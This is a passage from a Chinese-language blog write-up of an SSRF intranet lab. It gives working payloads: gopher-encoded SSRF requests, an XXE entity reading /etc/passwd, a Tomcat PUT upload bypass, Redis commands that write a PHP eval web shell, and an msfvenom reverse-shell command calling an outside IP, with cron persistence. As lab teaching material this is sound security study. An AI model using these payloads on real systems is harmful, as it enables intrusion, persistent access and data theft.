class="string">&quot;POST&quot;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&quot;doLogin.php&quot;</span>,</span><br><span class="line">        <span class="attr">contentType</span>: <span class="string">&quot;application/xml;charset=utf-8&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>: data,</span><br><span class="line">        <span class="attr">dataType</span>: <span class="string">&quot;xml&quot;</span>,</span><br><span class="line">        <span class="attr">anysc</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">success</span>: <span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">        	<span class="keyword">var</span> code = result.getElementsByTagName(<span class="string">&quot;code&quot;</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue;</span><br><span class="line">        	<span class="keyword">var</span> msg = result.getElementsByTagName(<span class="string">&quot;msg&quot;</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue;</span><br><span class="line">        	<span class="keyword">if</span>(code == <span class="string">&quot;0&quot;</span>)&#123;</span><br><span class="line">                swal(<span class="string">&quot;登录失败&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;error&quot;</span>);</span><br><span class="line">        	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="string">&quot;1&quot;</span>)&#123;</span><br><span class="line">                swal(<span class="string">&quot;登录成功&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;success&quot;</span>);</span><br><span class="line">        	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                swal(<span class="string">&quot;系统错误&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;success&quot;</span>);</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;); </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>用来登录的数据是xml格式的，这个还真不常见，毕竟现在基本没有开发者用xml格式存储登录信息了。<br>竟然这样就先构造一个POST请求吧，由于XMLHttpReque请求需要一些特定的头部，所以咱们先发送下请求，然后使用burp suite抓取到的请求包进行SSRF。</p>
+<div class="note primary simple"><p>注意URL编码的地方和次数，也不要忘了Content-Length参数</p>
+</div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">url=gopher%3a//172.72.23.25%3a80/_POST /doLogin.php HTTP/1.1</span><br><span class="line">Host: 1.13.173.107:18006</span><br><span class="line">Content-Type: application/xml;charset=utf-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 65</span><br><span class="line"></span><br><span class="line">&lt;user&gt;&lt;username&gt;admin&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+<p>测了下SQL注入没有作用，看了下源代码发现是作者根本没有进行数据库操作，那就尝试下XML注入。<br>返回给我们的部分是账号，那就在账号部分进行注入。<br>其实不直接返回到网页中也没关系，我们可以利用http协议来外带数据。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE aha [</span><br><span class="line">  &lt;!ENTITY aha SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;aha;&lt;/username&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+<p>可以直接写在一行中，这里为了看的更清楚就写了多行。不要忘记<code>&amp;aha</code>后面的<code>;</code>，否则程序不会识别成功。<br>通过XXE达到命令执行的目的需要利用编程语言所支持的协议，该过程先跳过，xxe漏洞一般是用来获取信息从而配合其它漏洞达到危害更高的目的。</p>
+<h1 id="172-72-23-26"><a href="#172-72-23-26" class="headerlink" title="172.72.23.26"></a>172.72.23.26</h1><p>8080端口是一个8.5版本的Tomcat，有一个漏洞是后台弱口令<code>tomcat/tomcat</code>，进入后台可以上传文件。因为是利用SSRF漏洞访问的，所以不太方便登入后台。<br>还存在一个CVE-2017-12615，可以用PUT方法上传文件。<br>Tomcat默认不允许上传<code>jsp jspx</code>格式的文件，但是我们可以更改文件后缀为<code>jsp/</code>进行绕过。<br>最后返回状态码<code>201 created</code>就证明上传成功了。<br>jsp马<a target="_blank" rel="noopener" href="https://github.com/threedr3am/JSP-WebShells">链接</a></p>
+<h1 id="172-72-23-27"><a href="#172-72-23-27" class="headerlink" title="172.72.23.27"></a>172.72.23.27</h1><p>开启了一个redis服务，使用dict协议访问一下看看有无认证。<br><code>dict://172.72.23.27:6379/info</code><br>发现无认证，那流程就像<code>28</code>靶机一样，只不过这次不需要认证了。</p>
+<h1 id="172-72-23-28"><a href="#172-72-23-28" class="headerlink" title="172.72.23.28"></a>172.72.23.28</h1><h2 id="80WEB服务-3"><a href="#80WEB服务-3" class="headerlink" title="80WEB服务"></a>80WEB服务</h2><p>首页显示了php源代码，存在文件包含漏洞，可以用该漏洞包含日志文件存而实现GetShell，但是访问的日志文件为空没有任何内容。查看其又开放了6379 redis端口但是需要输入密码进行验证，可以尝试爆破一下，但是存在LFI（本地文件包含漏洞）那么我们就可以尝试直接读取redis的配置文件获得密码。</p>
+<h3 id="读取redis配置文件"><a href="#读取redis配置文件" class="headerlink" title="读取redis配置文件"></a>读取redis配置文件</h3><p>如果不是自己手动安装的redis，那么redis的配置文件默认在/etc/redis.conf(网上大部分教程都存放在这里)。<br>通过输入<code>172.72.23.28:80?file=php://filter/read=convert.base64-encode/resource=/etc/redis.conf</code>读取base64编码后的内容，解码后查找<code>requirepass</code>，得到<code>requirepass P@ssw0rd</code>。<br>这里不知道为什么认证之后再执行命令还会显示需要认证，所以使用gopher协议一次执行多个指令。<br><em>待补充：socat查看流量信息</em><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lexus/archive/2012/12/02/2798796.html">https://www.cnblogs.com/lexus/archive/2012/12/02/2798796.html</a><br>这里使用<a target="_blank" rel="noopener" href="https://github.com/firebroo/sec_tools/tree/master/redis-over-gopher">redis-over-gopher</a>工具来生成payload。<br><img src="https://s2.loli.net/2022/04/02/B9iubNlWCEvjIS3.png" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://172.72.23.28:6379/_%2a%32%0d%0a%24%34%0d%0a%61%75%74%68%0d%0a%24%38%0d%0a%50%40%73%73%77%30%72%64%0d%0a%2a%31%0d%0a%24%34%0d%0a%69%6e%66%6f%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%31%33%0d%0a%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%39%0d%0a%73%68%65%6c%6c%2e%70%68%70%0d%0a%2a%34%0d%0a%24%34%0d%0a%73%68%6f%77%0d%0a%24%35%0d%0a%3c%3f%70%68%70%0d%0a%24%37%0d%0a%70%68%70%69%6e%66%6f%0d%0a%24%32%0d%0a%3f%3e%0d%0a</span><br></pre></td></tr></table></figure>
+<p>利用curl直接发送payload就可以，但是如果是浏览器直接发送则还需要将<strong>特殊字符</strong>再进行一次URL编码（可以直接使用burpsuite自带的功能），来避免特殊字符的干扰。因为PHP在接收到参数后会做一次URL的解码，这样当一些特殊字符再次发送时，是没有经过编码的，也就不会发送成功。<br>最后成功上传文件：<br><img src="https://s2.loli.net/2022/04/02/BnouaIfb5CsFlA1.png" alt="image.png"><br>为了更好的操作我们可以写入计划任务来定时反弹shell。该操作使用gopher一直写不进去，可以研究一下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">auth P@ssw0rd</span><br><span class="line">flushall</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename wtf2.php</span><br><span class="line">set shell &#x27;\r\n&lt;?php @eval($_GET[s]); ?&gt;\r\n&#x27;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<p>最后一定要save保存，否则不会保存在本地硬盘上面。<br><code>set &#39;wws&#39; &quot;&lt;?php @eval($_GET[&#39;cmd&#39;]); ?&gt;&quot;</code>双引号和单引号会影响该redis命令的执行，如果存在则不能执行成功。<br>可是自己直接在redis客户端中写没有问题，经过分析得出是工具的问题，如果payload中包含单引号或双引号会被换行符分隔开。<br><img src="https://s2.loli.net/2022/04/05/DPbCnialMO6ZKN9.png" alt="image.png"><br><img src="https://s2.loli.net/2022/04/05/jxyQZYrFgVTKb6h.png" alt="image.png"><br>在redis客户端监控中可以看到成功的写入了payload，可是在<code>/etc/crontab</code>中的换行符\r并没有真正的换行。<br>很有可能是对<code>\</code>进行转义了的原因。<br><img src="https://s2.loli.net/2022/04/05/ue96P4iUVBzsy7n.png" alt="image.png"><br>经过实验确实是如此，服务端对我们的特殊字符进行了转义处理。<br>不过没关系，方法总比问题多，我们可以利用文件操作函数加base64编码格式上传木马。给大家一个<a target="_blank" rel="noopener" href="https://www.cnblogs.com/-qing-/p/10819069.html">链接</a>可以参考一下。<br>base64编码后应该只存在数字和字母，需要注意一点的是目标服务器上面是否拥有shell运行所需要的模块，比如这里上传包含<code>posix_setsid()</code>的反弹shell马会报错，在文件里面删除这个函数的代码块即可。<br><img src="https://s2.loli.net/2022/04/03/n3PCy8tBD6kAdbp.png" alt="image.png"><br>之后访问该文件，可以看到成功的反弹了shell。</p>
+<h3 id="msfvenom-计划任务反弹shell"><a href="#msfvenom-计划任务反弹shell" class="headerlink" title="msfvenom+计划任务反弹shell"></a>msfvenom+计划任务反弹shell</h3><p>前面我们上传了一个php反弹shell，虽然可以用但是有点简陋并且随时可能被覆盖和删除，所以为了更好的操作我们可以上传一个可执行shell并且定时执行。<br>使用<code>linux/x64/meterpreter/reverse_tcp</code>这个选项来反弹shell。<br><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=42.192.56.33 LPORT=18014 -f elf -o shArp</code>生成一个名为shArp的Linux反弹shell文件。<br>之后咱们就把它上传到靶机上面，先使用<code>scp</code>传输到公网机器上面。<br><code>scp ./shArp user@ip:path</code><br><code>crontab 定时任务文件</code>将任务加入列表中。<br>之后使用<code>msfconsole</code>来利用我们的payload。<br><img src="https://s2.loli.net/2022/04/03/mYKx1j9zNhOWPo8.png" alt="image.png"><br>如何监听可以参考这个<a target="_blank" rel="noopener" href="https://www.cnblogs.com/-zhong/p/10916483.html">链接</a><br>大致过程如下：</p>
+<ul>
+<li><code>use multi/handler</code></li>
+<li><code>set payload linux/x64/meterpreter/reverse_tcp</code><ul>
+<li><code>set LHOST 0.0.0.0</code>设置监听地址</li>
+<li><code>set LPORT port</code>设置反向shell连接的端口</li>
+</ul>
+</li>
+<li><code>run</code></li>
+</ul>
+<p><img src="https://s2.loli.net/2022/04/03/RNItDJnfHWTeM6i.png" alt="image.png"><br>成功的反弹了一个shell，如果退出该界面了可以使用<code>sessions id</code>来重新进入到该会话里面。</p>
+<h1 id="172-72-23-30"><a href="#172-72-23-30" class="headerlink" title="172.72.23.30"></a>172.72.23.30</h1><p>开启了mysql服务，也是先验证一下有没有认证。<br>具体的写shell提权方式可以参考<a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/11/mysql.html">国光师傅</a>的博客，写地很详细。<br>当然如果想使用gopher攻击，我们需要知道mysql通信地数据包格式，然后进行构造，也可以直接自己本地请求将包dump掉发送。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">sh@rp</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://sharpa.cn/2022/04/01/SSRF%E6%89%93%E5%86%85%E7%BD%91/">https://sharpa.cn/2022/04/01/SSRF%E6%89%93%E5%86%85%E7%BD%91/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://sharpa.cn" target="_blank">知识茧房</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" data-sites="twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/04/01/CSAPP-bomblab/"><img class="prev-cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">CSAPP-bomblab</div></div></a></div><div class="next-post pull-right"><a href="/2022/03/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><img class="next-cover" src="https://s2.loli.net/2022/03/19/VZdNvELIAxOUY3o.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Java反序列化</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95"><span class="toc-number">1.</span> <span class="toc-text">一些想法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">2.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%9C%8D%E5%8A%A1"><span class="toc-number">3.</span> <span class="toc-text">外网服务</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8dict%E7%AD%89%E5%8D%8F%E8%AE%AE%E8%BF%9B%E8%A1%8C%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-number">3.1.</span> <span class="toc-text">利用dict等协议进行端口探测</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#172-72-23-22"><span class="toc-number">4.</span> <span class="toc-text">172.72.23.22</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#80WEB%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.1.</span> <span class="toc-text">80WEB服务</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#172-72-23-23"><span class="toc-number">5.</span> <span class="toc-text">172.72.23.23</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#80WEB%E6%9C%8D%E5%8A%A1-1"><span class="toc-number">5.1.</span> <span class="toc-text">80WEB服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5WEB-shell"><span class="toc-number">5.1.1.</span> <span class="toc-text">写入WEB shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#172-72-23-24"><span class="toc-number">6.</span> <span class="toc-text">172.72.23.24</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#80WEB%E6%9C%8D%E5%8A%A1-2"><span class="toc-number">6.1.</span> <span class="toc-text">80WEB服务</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#172-72-23-25"><span class="toc-number">7.</span> <span class="toc-text">172.72.23.25</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#172-72-23-26"><span class="toc-number">8.</span> <span class="toc-text">172.72.23.26</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#172-72-23-27"><span class="toc-number">9.</span> <span class="toc-text">172.72.23.27</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#172-72-23-28"><span class="toc-number">10.</span> <span class="toc-text">172.72.23.28</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#80WEB%E6%9C%8D%E5%8A%A1-3"><span class="toc-number">10.1.</span> <span class="toc-text">80WEB服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96redis%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">10.1.1.</span> <span class="toc-text">读取redis配置文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msfvenom-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">10.1.2.</span> <span class="toc-text">msfvenom+计划任务反弹shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#172-72-23-30"><span class="toc-number">11.</span> <span class="toc-text">172.72.23.30</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By <i id="heartbeat" class="fa fas fa-heartbeat"></i>sh@rp</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">build with love</div></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">本地搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
+  const $mermaidWrap = document.querySelectorAll('#article-container .mermaid-wrap')
+  if ($mermaidWrap.length) {
+    window.runMermaid = () => {
+      window.loadMermaid = true
+      const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+      Array.from($mermaidWrap).forEach((item, index) => {
+        const mermaidSrc = item.firstElementChild
+        const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+        const mermaidID = 'mermaid-' + index
+        const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+        mermaid.mermaidAPI.render(mermaidID, mermaidDefinition, (svgCode) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svgCode)
+        })
+      })
+    }
+
+    const loadMermaid = () => {
+      window.loadMermaid ? runMermaid() : getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaid)
+    }
+
+    window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+  }
+})()</script><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'WskQ6716WawpeVqRaU0LAwqR-gzGzoHsz',
+      appKey: '27h76RwyIhyB3XAO5S3RDPEQ',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'https://sharpa.cn/2022/04/01/SSRF%E6%89%93%E5%86%85%E7%BD%91/'
+    this.page.identifier = '2022/04/01/SSRF打内网/'
+    this.page.title = 'SSRF打内网'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !false) {
+  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
